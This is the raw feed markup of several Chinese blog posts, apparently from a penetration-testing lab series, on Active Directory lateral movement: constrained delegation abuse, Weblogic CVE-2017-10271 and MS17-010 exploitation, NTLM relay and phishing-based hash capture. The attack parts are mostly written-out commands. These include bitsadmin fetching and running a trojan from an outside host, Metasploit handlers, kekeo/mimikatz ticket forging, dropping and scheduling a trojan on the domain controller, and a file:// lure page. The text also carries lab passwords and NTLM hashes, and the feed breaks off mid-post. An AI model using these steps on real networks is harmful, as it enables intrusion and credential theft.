class="headerlink" title="判断查询"></a>判断查询</h3><p>上传Adfind<br><a href="https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml">https://www.softpedia.com/get/Programming/Other-Programming-Files/AdFind.shtml</a><br>查询机器用户（主机）配置约束委派</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665886236920-2f99656d-fbb8-4dc7-b871-031877d2b695.png" alt="image.png"><br>查询服务账户（主机）配置约束委派</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665886266294-612e2dba-3e89-4cd7-bc30-ccac389c7320.png" alt="image.png"></p><h3 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h3><p>上传kekeo<br><a href="https://github.com/gentilkiwi/kekeo">https://github.com/gentilkiwi/kekeo</a></p><h4 id="1、获取用户的票据"><a href="#1、获取用户的票据" class="headerlink" title="1、获取用户的票据"></a>1、获取用户的票据</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">明文密码利用</span></span><br><span class="line">kekeo &quot;tgt::ask /user:webadmin /domain:god.org /password::admin!@#45 /ticket:administrator.kirbi&quot; &quot;exit&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">hash</span>利用</span></span><br><span class="line">kekeo &quot;tgt::ask /user:webadmin /domain:god.org /NTLM:518b98ad4178a53695dc997aa02d455c /ticket:administrator.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665886784210-8a029af9-ac06-40fd-a7ab-4a328e8d3919.png" alt="image.png"></p><h4 id="2、利用用户票据获取域控票据"><a href="#2、利用用户票据获取域控票据" class="headerlink" title="2、利用用户票据获取域控票据"></a>2、利用用户票据获取域控票据</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">计算机名利用</span></span><br><span class="line">kekeo &quot;tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god&quot; &quot;exit&quot;</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">域名利用</span></span><br><span class="line">kekeo &quot;tgs::s4u /tgt:TGT_webadmin@GOD.ORG_krbtgt~god.org@GOD.ORG.kirbi /user:Administrator@god.org /service:cifs/owa2010cn-god.god.org&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665886907781-09a85d85-907e-443b-b635-fede0b91bc5e.png" alt="image.png"></p><h4 id="3、导入票据到内存"><a href="#3、导入票据到内存" class="headerlink" title="3、导入票据到内存"></a>3、导入票据到内存</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt TGS_Administrator@god.org@GOD.ORG_cifs~owa2010cn-god.god.org@GOD.ORG.kirbi</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665886961659-1c562e76-69e6-44f0-84a5-4a9bbabed429.png" alt="image.png"></p><h4 id="4、连接通讯域控"><a href="#4、连接通讯域控" class="headerlink" title="4、连接通讯域控"></a>4、连接通讯域控</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\owa2010cn-god.god.org\c$</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665886984646-115b96ed-5b5c-4498-a25f-f5cc2dab93b3.png" alt="image.png"><br>后续可以利用copy&amp;at拿下域控</p><h2 id="实战靶机-约束委派"><a href="#实战靶机-约束委派" class="headerlink" title="实战靶机-约束委派"></a>实战靶机-约束委派</h2><p>从外网 Weblogic 打到内网，再到约束委派接管域控<br><img src="/posts/dc35434a/1665746136715-f2078bd9-893d-440b-b776-9dc6a5280777.png" alt="image.png"></p><h3 id="攻击Weblogic-CVE-2017-10271"><a href="#攻击Weblogic-CVE-2017-10271" class="headerlink" title="攻击Weblogic - CVE-2017-10271"></a>攻击Weblogic - CVE-2017-10271</h3><p><img src="/posts/dc35434a/1665821780451-a4412309-63e9-4b01-93a1-6ddaac1d9f40.png" alt="image.png"><br><img src="/posts/dc35434a/1665821863546-6546b9ef-112a-4fe9-bb50-6e18e57fa665.png" alt="image.png"><br>下载执行木马上线CS</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">下载木马</span></span><br><span class="line">bitsadmin /rawreturn /transfer down &quot;http://192.168.118.1/test.exe&quot; C:\\Oracle\\Middleware\\Oracle_Home\\user_projects\\domains\\base_domain\\test.exe</span><br><span class="line">test.exe #执行</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665822305486-e85b859e-2815-4ac2-b7b4-fdc5d1a5cb85.png" alt="image.png"><br>常规信息搜集<br><img src="/posts/dc35434a/1665822908478-a0e35e87-d4ee-483f-8321-9bebeaa86d82.png" alt="image.png"><br>上传fscan扫描-实战中尽量挂代理在本机扫描,不要上传<br><img src="/posts/dc35434a/1665823719748-49aa9572-4a8c-41bc-b197-a97b4c3bd3d9.png" alt="image.png"></p><h3 id="攻击域内成员主机-MS17-010"><a href="#攻击域内成员主机-MS17-010" class="headerlink" title="攻击域内成员主机 - MS17-010"></a>攻击域内成员主机 - MS17-010</h3><h4 id="1、CS执行联动MSF"><a href="#1、CS执行联动MSF" class="headerlink" title="1、CS执行联动MSF"></a>1、CS执行联动MSF</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawn msf</span><br></pre></td></tr></table></figure><h4 id="2、MSF监听联动配置"><a href="#2、MSF监听联动配置" class="headerlink" title="2、MSF监听联动配置"></a>2、MSF监听联动配置</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665823831753-2b4f719b-94ff-449e-96dc-00afab98a0ac.png" alt="image.png"></p><h4 id="3、添加路由"><a href="#3、添加路由" class="headerlink" title="3、添加路由"></a>3、添加路由</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p #查看当前路由表</span><br><span class="line">run post/multi/manage/autoroute #添加当前路由表</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665824104675-381e82fc-c882-43d1-86ac-3ef45ff2e27b.png" alt="image.png"></p><h4 id="4、利用模块"><a href="#4、利用模块" class="headerlink" title="4、利用模块"></a>4、利用模块</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">set payload windows/x64/meterpreter/bind_tcp #正向连接上线</span><br><span class="line">set rhost 10.10.20.7 #设置连接目标</span><br><span class="line">set rhosts 10.10.20.7 #设置扫描目标</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665824040764-a08997fe-690b-4cda-a191-7c4f39c1b279.png" alt="image.png"><br>MSF操作不太方便可以将会话转到CS<br>CS生成一个正向木马<br><img src="/posts/dc35434a/1665825027773-14db3b49-c0f0-4344-8a35-6fc0c78da6c5.png" alt="image.png"><br>上传到win7</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /root/zx.exe C:\\zx.exe</span><br></pre></td></tr></table></figure><p>CS连接</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">connect 10.10.20.7 2222</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665825438623-19f4445e-b6dd-4a25-bd5d-b838e4854423.png" alt="image.png"><br>再次信息搜集<br><img src="/posts/dc35434a/1665826031969-940508bf-47e8-410e-abdc-7a064ce20189.png" alt="image.png"><br><img src="/posts/dc35434a/1665836126256-1de42374-1c5a-4864-83aa-109933db92ff.png" alt="image.png"><br><img src="/posts/dc35434a/1665836181730-6e4836a3-b484-4107-9cca-a91c115b7f23.png" alt="image.png"><br>CS的mimikatz没有抓到密码 用msf试下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz</span><br><span class="line">creds_all</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665836276638-661d5e88-2cc4-48e7-a761-a2f8cbd4537c.png" alt="image.png"></p><h4 id="5、查找域内非约束委派用户和计算机"><a href="#5、查找域内非约束委派用户和计算机" class="headerlink" title="5、查找域内非约束委派用户和计算机"></a>5、查找域内非约束委派用户和计算机</h4><p>先上传AdFind</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h 10.10.10.8 -u saul -up admin!@#45 -b &quot;DC=redteam,DC=red&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; cn distinguishedName msds-allowedtodelegateto</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665836619467-1ef4dd53-c20e-4fde-89e8-cfe9da6ae8b0.png" alt="image.png"><br>sqlserver存在约束委派<br><img src="/posts/dc35434a/1665836784502-2319d1dc-dd3d-468c-828f-0af1ee074721.png" alt="image.png"></p><h4 id="6、信息收集加口令加漏洞探针"><a href="#6、信息收集加口令加漏洞探针" class="headerlink" title="6、信息收集加口令加漏洞探针"></a>6、信息收集加口令加漏洞探针</h4><p>对sqlserver 10.10.10.18进行信息搜集</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan64.exe -h 10.10.10.18</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665836959387-2a9d3aeb-285a-4580-8d50-9855625be43f.png" alt="image.png"></p><h3 id="攻击域内数据库主机-MSSQL-提权"><a href="#攻击域内数据库主机-MSSQL-提权" class="headerlink" title="攻击域内数据库主机-MSSQL+提权"></a>攻击域内数据库主机-MSSQL+提权</h3><p><a href="https://github.com/SafeGroceryStore/MDUT">https://github.com/SafeGroceryStore/MDUT</a><br>配置代理<br>利用工具MDUT连接数据库,上传文件并执行<br><img src="/posts/dc35434a/1665843116221-4ca66e7a-14da-4899-86af-533e217176b4.png" alt="image.png"><br>到cs用ms14-058提权<br>提权时需要在win7新建一个监听器用来接受会话<br><img src="/posts/dc35434a/1665840586872-95ac0f64-6dc7-431d-8b89-a3d9b8ad3ca5.png" alt="image.png"><br><img src="/posts/dc35434a/1665840604615-1faad3aa-6867-4083-a7ea-b2337e90eccc.png" alt="image.png"><br><img src="/posts/dc35434a/1665840711327-0415fc5a-0cbd-46f6-94e2-30e0742ec0bc.png" alt="image.png"><br>成功拿到密码</p><h3 id="攻击域内域控主机-约束委派"><a href="#攻击域内域控主机-约束委派" class="headerlink" title="攻击域内域控主机-约束委派"></a>攻击域内域控主机-约束委派</h3><h4 id="1、kekeo请求获取sqlserver的TGT"><a href="#1、kekeo请求获取sqlserver的TGT" class="headerlink" title="1、kekeo请求获取sqlserver的TGT"></a>1、kekeo请求获取sqlserver的TGT</h4><p>先上传kekeo</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo &quot;tgt::ask /user:sqlserver /domain:redteam.red /password:Server12345 /ticket:administrator.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665840926996-93f66394-ef37-4935-a81c-a199520ea454.png" alt="image.png"><br><img src="/posts/dc35434a/1665841274718-f0fb2aab-8e4d-40ee-9c0e-1890db6cb3ee.png" alt="image.png"></p><h4 id="2、使用票据请求域控"><a href="#2、使用票据请求域控" class="headerlink" title="2、使用票据请求域控"></a>2、使用票据请求域控</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo &quot;tgs::s4u /tgt:TGT_sqlserver@REDTEAM.RED_krbtgt~redteam.red@REDTEAM.RED.kirbi /user:Administrator@redteam.red /service:cifs/owa.redteam.red&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665840956003-80221653-8d03-48f6-b173-878a6fdb2acc.png" alt="image.png"><br><img src="/posts/dc35434a/1665841163302-bbeff344-66eb-43be-baac-feff9fdb5b0d.png" alt="image.png"></p><h4 id="3、导入内存"><a href="#3、导入内存" class="headerlink" title="3、导入内存"></a>3、导入内存</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt TGS_Administrator@redteam.red@REDTEAM.RED_cifs~owa.redteam.red@REDTEAM.RED.kirbi</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665841308580-6c53b80f-ed0b-4046-8785-5f61bbf4595b.png" alt="image.png"></p><h4 id="4、连接域控"><a href="#4、连接域控" class="headerlink" title="4、连接域控"></a>4、连接域控</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\OWA\\c$</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665842165495-aaf48a64-9356-4e7b-a67c-34a254100043.png" alt="image.png"><br>后续利用拿下域控</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">net use \\owa</span><br><span class="line">copy zx.exe \\owa\c$ # 木马复制到域控</span><br><span class="line">at \\owa 18:45 c:\zx.exe # 计划任务执行木马</span><br><span class="line">connect 10.10.10.8 2222 </span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665842316134-80086269-dabd-4b3c-8f1e-faf2a186cf25.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向移动(七)-Relay重放&amp;Responder中继攻击</title>
      <link href="/posts/1a5f619c/"/>
      <url>/posts/1a5f619c/</url>
      
        <content type="html"><![CDATA[<h1 id="内网横向移动-七-Relay重放-amp-Responder中继攻击"><a href="#内网横向移动-七-Relay重放-amp-Responder中继攻击" class="headerlink" title="内网横向移动(七)-Relay重放&amp;Responder中继攻击"></a>内网横向移动(七)-Relay重放&amp;Responder中继攻击</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>与NLTM认证相关的安全问题主要有Pass The Hash、利用NTLM进行信息收集、Net-NTLM Hash破解、NTLM Relay几种。PTH前期已经了，运用mimikatz、impacket工具包的一些脚本、CS等等都可以利用，NTLM Relay又包括（relay to smb,ldap,ews）<br>可以应用在获取不到明文或HASH时采用的手法，但也要注意手法的必备条件。<br><img src="/posts/1a5f619c/1665544851104-603ef2c7-7657-4ddc-9f6f-9e1c5ee40a8e.png" alt="image.png"><br><img src="/posts/1a5f619c/1665544818072-73433c60-dc74-4590-b588-2c71476002cb.png" alt="image.png"><br>老样子上线webserver并提权,信息搜集<br><img src="/posts/1a5f619c/1665547898009-aa818acd-5491-4e5d-8efc-af9b59410344.png" alt="image.png"><br><img src="/posts/1a5f619c/1665547907274-8ec4cc7b-5298-4e84-9760-a8917de12177.png" alt="image.png"><br><strong>Relay重放有什么用?</strong><br>利用webserver的本地用户<code>administrator/admin!@#45</code><br>cmd输入命令 <code>dir \\192.168.3.32\c$</code><br><img src="/posts/1a5f619c/1665549191599-4e889e15-4fdb-4d91-80bf-a79a169a7bdd.png" alt="image.png"><br>发现可以直接连接sqlserver<br>这是因为再进行连接的时候会先使用当前登录的用户和密码登录目标主机进行尝试,而目标主机的账号密码也是<code>administrator/admin!@#45</code>导致连接成功<br>从而我们利用这一特性可以达成横向移动</p><h2 id="NTLM中继攻击-Relay重放-SMB上线"><a href="#NTLM中继攻击-Relay重放-SMB上线" class="headerlink" title="NTLM中继攻击-Relay重放-SMB上线"></a>NTLM中继攻击-Relay重放-SMB上线</h2><p>条件：通讯双方当前用户密码一致</p><h3 id="CS联动MSF"><a href="#CS联动MSF" class="headerlink" title="CS联动MSF"></a>CS联动MSF</h3><h4 id="CS配置"><a href="#CS配置" class="headerlink" title="CS配置"></a>CS配置</h4><p><img src="/posts/1a5f619c/1665557031238-ba20a8d1-78c5-4f1e-b32a-b3bd6b92651a.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawn msf</span><br></pre></td></tr></table></figure><p><img src="/posts/1a5f619c/1665557077310-d692d96a-64af-4dc6-b7ac-93a3dabc1e3d.png" alt="image.png"></p><h4 id="MSF配置"><a href="#MSF配置" class="headerlink" title="MSF配置"></a>MSF配置</h4><h5 id="监听上线"><a href="#监听上线" class="headerlink" title="监听上线"></a>监听上线</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/1a5f619c/1665557205270-ab8b01c4-b5d4-4159-81fb-bbf41c1fc04f.png" alt="image.png"></p><h5 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p #查看当前路由表</span><br><span class="line">run post/multi/manage/autoroute #添加当前路由表</span><br><span class="line">background #返回</span><br></pre></td></tr></table></figure><h5 id="重发模块"><a href="#重发模块" class="headerlink" title="重发模块"></a>重发模块</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/smb_relay</span><br><span class="line">set smbhost 192.168.3.32 #转发攻击目标</span><br><span class="line">set lhost 192.168.118.132 #设置本地IP</span><br><span class="line">set autorunscript post/windows/manage/migrate</span><br></pre></td></tr></table></figure><h5 id="主动连接"><a href="#主动连接" class="headerlink" title="主动连接"></a>主动连接</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/bind_tcp #主机不出网采用正向连接</span><br><span class="line">set rhost 192.168.3.32 #设置连接目标</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/1a5f619c/1665558368297-fa3cde0a-5e03-46e2-ae4a-b37db6327071.png" alt="image.png"></p><h3 id="上线操作"><a href="#上线操作" class="headerlink" title="上线操作"></a>上线操作</h3><h4 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h4><p>由于我们要用本地账户去利用，但我们拿到的权限都是域用户和system用户，我们要降权到本地administrator来进行利用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">cs执行</span></span><br><span class="line">ps #查看进程</span><br></pre></td></tr></table></figure><p><img src="/posts/1a5f619c/1665558551776-47948b6a-a1e1-40d1-a057-1e1d0f63dc34.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steal_token 3804 #窃取pid值为3804的进程</span><br></pre></td></tr></table></figure><p><img src="/posts/1a5f619c/1665558639197-7891b51c-2155-4c47-9d05-bcb3ff9efbc2.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\192.168.118.132\c$</span><br></pre></td></tr></table></figure><p><img src="/posts/1a5f619c/1665558698020-76b20120-4cac-47a9-9894-cfa92864cf89.png" alt="image.png"><br>显示登录失败但没关系<br><img src="/posts/1a5f619c/1665558756311-3200496b-054d-484d-9f04-6c16bd892966.png" alt="image.png"><br>msf成功接收到会话<br><img src="/posts/1a5f619c/1665558821848-89e49447-c04a-4ef0-9a96-619ea6ee9d57.png" alt="image.png"><br>成功上线</p><h4 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps #查看进程</span><br></pre></td></tr></table></figure><p><img src="/posts/1a5f619c/1665570062053-ca8e3839-ed61-4bc1-8dd8-b45ad6bac815.png" alt="image.png"><br><img src="/posts/1a5f619c/1665569892801-d4ff03c8-d0ec-4e9c-b316-53f157ef9e0d.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate 2660</span><br></pre></td></tr></table></figure><p><img src="/posts/1a5f619c/1665570246501-f61f6ceb-4b69-4e9a-bd87-ae2ce68ff7ad.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">进入到shell 利用smb协议</span></span><br><span class="line">shell</span><br><span class="line">dir \\192.168.118.132\c$</span><br></pre></td></tr></table></figure><p><img src="/posts/1a5f619c/1665587866506-ddd79f37-5158-4e61-b12a-0df2953bfaac.png" alt="image.png"></p><h2 id="NTLM中继攻击-Inveigh嗅探-Hash破解"><a href="#NTLM中继攻击-Inveigh嗅探-Hash破解" class="headerlink" title="NTLM中继攻击-Inveigh嗅探-Hash破解"></a>NTLM中继攻击-Inveigh嗅探-Hash破解</h2><p>条件：被控主机当前管理员权限<br>Responder中继攻击-NTLM Hash破解</p><h3 id="1、监听拦截"><a href="#1、监听拦截" class="headerlink" title="1、监听拦截"></a>1、监听拦截</h3><p><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a><br>将lnveigh上传到192.168.3.32<br><img src="/posts/1a5f619c/1665661916783-74e539f0-b1c0-4ac7-b2ae-51357314b42f.png" alt="image.png"><br><img src="/posts/1a5f619c/1665662012920-680f2d41-63bc-43f3-95e2-827e607f9416.png" alt="image.png"></p><h3 id="2、触发拦截"><a href="#2、触发拦截" class="headerlink" title="2、触发拦截"></a>2、触发拦截</h3><p>这个时候如果有主机来访问我们</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\192.168.3.32\c$</span><br></pre></td></tr></table></figure><p><img src="/posts/1a5f619c/1665662049146-6498db84-29f4-44c9-9f5c-065d5c9ba06d.png" alt="image.png"><br><img src="/posts/1a5f619c/1665662070372-5596069c-95d7-4069-903d-dbb4fceab591.png" alt="image.png"><br>就会拿到该主机的hash值</p><h4 id="2-1、钓鱼触发"><a href="#2-1、钓鱼触发" class="headerlink" title="2.1、钓鱼触发"></a>2.1、钓鱼触发</h4><p>实战中如何触发呢?利用web服务<br>上传一个钓鱼页面到web目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /root/1.html C:\inetpub\wwwroot</span><br></pre></td></tr></table></figure><p><img src="/posts/1a5f619c/1665668039741-dcd6a578-8092-4c87-8427-f1a8a4785246.png" alt="image.png"><br><a href="http://192.168.3.32/1.html">http://192.168.3.32/1.html</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;img src=&quot;file:///\\192.168.3.32\2&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>钓鱼访问该链接获取到的shell会写在一个文件里<br><img src="/posts/1a5f619c/1665668793692-5f1781ae-e7c7-43f6-9a93-65629d575919.png" alt="image.png"><br>直接用命令查看显示不完整下载到本地</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">download Inveigh-NTLMv2Users.txt /root/</span><br></pre></td></tr></table></figure><p><img src="/posts/1a5f619c/1665668845664-fb86f960-d9f7-4ca3-94d5-f5de38e2563f.png" alt="image.png"><br><img src="/posts/1a5f619c/1665669424743-dc0a6541-1a3f-49ed-9069-eec96a30407f.png" alt="image.png"></p><h3 id="3、破解密文"><a href="#3、破解密文" class="headerlink" title="3、破解密文"></a>3、破解密文</h3><p><a href="https://github.com/hashcat/hashcat/">https://github.com/hashcat/hashcat/</a></p><p>pass.txt中内容为信息搜集获取到的明文密码<br>利用获取到的明文密码来爆破获取到的hash值来获取主机明文密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 [hash] pass.txt --show</span><br></pre></td></tr></table></figure><p><img src="/posts/1a5f619c/1665670233906-f66e347c-5d98-4ad8-a090-5920264df22f.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向移动(六)-域控提权</title>
      <link href="/posts/661c6a19/"/>
      <url>/posts/661c6a19/</url>
      
        <content type="html"><![CDATA[<h1 id="内网横向移动-六-域控提权"><a href="#内网横向移动-六-域控提权" class="headerlink" title="内网横向移动(六)-域控提权"></a>内网横向移动(六)-域控提权</h1><h2 id="CVE-2017-0146-MS17010"><a href="#CVE-2017-0146-MS17010" class="headerlink" title="CVE-2017-0146(MS17010)"></a>CVE-2017-0146(MS17010)</h2><p>影响范围:Windows 7 8.1 10; Windows Server 2008 2012 2016;<br>-插件检测-横向移动<br>-CS联动MSF-检测&amp;利用<br>1、CS上线webserver<br><img src="/posts/661c6a19/1665370492979-a0b46cbf-0e9d-40c5-824e-c32aafdb9066.png" alt="image.png"><br>2、CS执行联动MSF<br>CS创建监听器<br><img src="/posts/661c6a19/1665370611881-b8fd5987-6d50-45b3-997e-f47d1a9c36d3.png" alt="image.png"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">上线主机会话交互执行</span></span><br><span class="line">spawn msf #msf为监听器名称</span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665370924573-13f3297f-9850-4b08-a111-d1c8f6486761.png" alt="image.png"><br>3、MSF监听联动配置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 8888</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665370907262-9051a68a-7c14-4226-8a25-19474ff502c0.png" alt="image.png"><br>4、添加路由</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -p #查看当前路由表</span><br><span class="line">run post/multi/manage/autoroute #添加当前路由表</span><br></pre></td></tr></table></figure><p><img src="/posts/661c6a19/1665371049828-164494b0-5c2b-46b5-ae59-26b7d393579b.png" alt="image.png"><br>5、检测模块</p><figure class="highlight 